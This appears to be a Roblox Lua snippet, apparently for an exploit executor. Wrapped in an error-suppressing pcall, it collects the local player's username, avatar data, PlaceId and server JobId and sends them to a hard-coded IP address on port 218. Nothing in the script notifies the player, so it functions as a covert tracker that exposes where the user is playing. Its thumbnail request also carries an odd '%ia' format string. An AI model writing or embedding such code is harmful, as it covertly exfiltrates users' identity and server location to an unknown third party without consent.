pcall(function()
    local Username = game.Players.LocalPlayer.Name
    local PlaceId = game.PlaceId
    
    local function getPfpLINK()
        local http = game:GetService("HttpService")

        local backup = "https://icon-library.com/images/steam-question-mark-icon/steam-question-mark-icon-2.jpg"
        local pfp
            
        local success, fail = pcall(function()
            pfp = game:HttpGet(("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=%ia&size=150x150&format=Png&isCircular=true"):format(game.Players.LocalPlayer.UserId))
        end)

        if success and not fail then
            pfp = http:JSONDecode(pfp)

            return pfp
        elseif fail and not success then
            return {data = {{imageUrl = backup}}}
        end
    end
    
    local Data = {
        Username = Username,
        PFP_Data = getPfpLINK(),
        GamePlaceId = PlaceId,
        JobId = game.JobId
    }

    local Compiled = game:GetService("HttpService"):JSONEncode(Data)
    local Formatted = ("http://70.105.254.224:218/?json=%s"):format(Compiled)
    
    game:HttpGet(Formatted)
end)
